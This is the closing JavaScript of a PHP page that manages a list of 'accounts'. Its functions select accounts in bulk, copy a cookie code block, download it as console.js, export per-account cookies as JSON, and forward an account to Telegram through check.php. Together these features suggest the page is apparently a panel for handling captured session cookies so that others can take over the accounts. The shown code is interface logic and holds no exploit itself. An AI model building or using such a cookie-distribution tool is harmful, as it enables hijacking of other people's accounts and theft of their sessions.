                const accountItems = Array.from(document.querySelectorAll('.account-item'));
                const currentIndex = accountItems.findIndex(item => item.dataset.accountId == accountId);
                
                if (currentIndex !== -1) {
                    selectRange(lastCheckedIndex, currentIndex);
                    // Update last checked index to the end of the range
                    lastCheckedIndex = currentIndex;
                }
            } else {
                // Normal click - navigate to account details
                const url = new URL(window.location);
                url.searchParams.set('id', accountId);
                url.searchParams.set('page', 'dashboard');
                window.location.href = url.toString();
            }
        }

        function handleCheckboxClick(event, accountId) {
            const checkbox = event.target;
            const accountItem = checkbox.closest('.account-item');
            const accountItems = Array.from(document.querySelectorAll('.account-item'));
            const currentIndex = accountItems.findIndex(item => item.dataset.accountId == accountId);
            
            // Handle shift-click on checkbox
            if (event.shiftKey && lastCheckedIndex !== -1 && currentIndex !== -1) {
                event.preventDefault();
                selectRange(lastCheckedIndex, currentIndex);
                lastCheckedIndex = currentIndex;
                return;
            }
            
            // Normal checkbox click
            if (checkbox.checked) {
                selectedAccounts.add(accountId.toString());
                accountItem.classList.add('selected');
                if (currentIndex !== -1) {
                    lastCheckedIndex = currentIndex;
                }
            } else {
                selectedAccounts.delete(accountId.toString());
                accountItem.classList.remove('selected');
            }
            
            updateBulkActions();
        }

        function selectAll() {
            const checkboxes = document.querySelectorAll('.account-checkbox');
            const accountItems = document.querySelectorAll('.account-item');
            
            checkboxes.forEach((checkbox, index) => {
                const accountId = checkbox.dataset.accountId;
                checkbox.checked = true;
                selectedAccounts.add(accountId);
                accountItems[index].classList.add('selected');
            });
            
            if (accountItems.length > 0) {
                lastCheckedIndex = accountItems.length - 1;
            }
            
            updateBulkActions();
        }

        function deselectAll() {
            const checkboxes = document.querySelectorAll('.account-checkbox');
            const accountItems = document.querySelectorAll('.account-item');
            
            checkboxes.forEach((checkbox, index) => {
                checkbox.checked = false;
                accountItems[index].classList.remove('selected');
            });
            
            selectedAccounts.clear();
            lastCheckedIndex = -1;
            updateBulkActions();
        }

        function copyCookie() {
            const code = document.getElementById('cookie-code').innerText;
            navigator.clipboard.writeText(code).then(() => {
                alert('Cookie copied to clipboard!');
            }).catch(() => {
                alert('Failed to copy cookie.');
            });
        }

        function downloadConsole() {
            const code = document.getElementById('cookie-code').innerText;
            const blob = new Blob([code], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'console.js';
            a.click();
            URL.revokeObjectURL(url);
        }

        function downloadJSON() {
            <?php if ($selected_account && $selected_account['cookies_json_export']): ?>
                const json = <?php echo json_encode($selected_account['cookies_json_export']); ?>;
                const blob = new Blob([json], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'cookies.json';
                a.click();
                URL.revokeObjectURL(url);
            <?php else: ?>
                alert('No JSON data available');
            <?php endif; ?>
        }

        function sendToTG(accountId, btn) {
            const originalText = btn.textContent;
            btn.textContent = 'Sending...';
            btn.disabled = true;
            
            const formData = new FormData();
            formData.append('send_to_telegram', '1');
            formData.append('account_id', accountId);
            
            fetch('check.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                btn.textContent = originalText;
                btn.disabled = false;
            })
            .catch(error => {
                alert('Error sending to Telegram: ' + error);
                btn.textContent = originalText;
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>